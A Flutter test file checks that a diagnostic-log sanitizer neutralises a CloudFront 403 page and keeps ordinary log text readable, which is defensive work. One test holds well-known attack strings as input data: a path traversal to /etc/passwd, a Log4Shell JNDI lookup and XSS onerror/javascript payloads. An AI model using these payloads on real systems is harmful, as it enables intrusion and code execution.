// The CloudFront WAF inspects diagnostic JSON bodies and blocks common attack
// patterns even when they appear inside harmless log text. These tests keep
// the sanitizer honest: the patterns that really caused 403s must be neutral,
// while ordinary log text must stay readable.

import 'package:flutter_test/flutter_test.dart';
import 'package:mama_ai/features/chat/data/local/diagnostic_logger.dart';

void main() {
  group('sanitizeForWaf', () {
    test('neutralises the CloudFront 403 HTML that caused the loop', () {
      const page =
          '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">'
          '<HTML><HEAD><TITLE>ERROR: The request could not be satisfied'
          '</TITLE></HEAD><BODY><H1>403 ERROR</H1>Request blocked.</BODY></HTML>';

      final safe = DiagnosticLogger.sanitizeForWaf(page);

      expect(safe, isNot(contains('<')));
      expect(safe, isNot(contains('>')));
      expect(safe, contains('‹!DOCTYPE'));
      expect(safe, contains('403 ERROR'));
    });

    test('neutralises path traversal, Log4Shell and XSS patterns', () {
      const input =
          '../../etc/passwd ..\\windows '
          r'${jndi:ldap://example.com/a} '
          'javascript:alert(1) <img src=x onerror=alert(1)> '
          '%2e%2e%2f %5c';

      final safe = DiagnosticLogger.sanitizeForWaf(input);

      expect(safe, isNot(contains('../')));
      expect(safe, isNot(contains('..\\')));
      expect(safe.toLowerCase(), isNot(contains('jndi:')));
      expect(safe.toLowerCase(), isNot(contains('javascript:')));
      expect(safe.toLowerCase(), isNot(contains('onerror=')));
      expect(safe.toLowerCase(), isNot(contains('%2e')));
      expect(safe.toLowerCase(), isNot(contains('%2f')));
      expect(safe.toLowerCase(), isNot(contains('%5c')));
    });

    test('keeps ordinary diagnostic text unchanged', () {
      const input =
          'Offline inference finished in 8100 ms with 2 passages; '
          'model=samsung/SM-A546B network=no_internet success=true';

      expect(DiagnosticLogger.sanitizeForWaf(input), input);
    });
  });
}
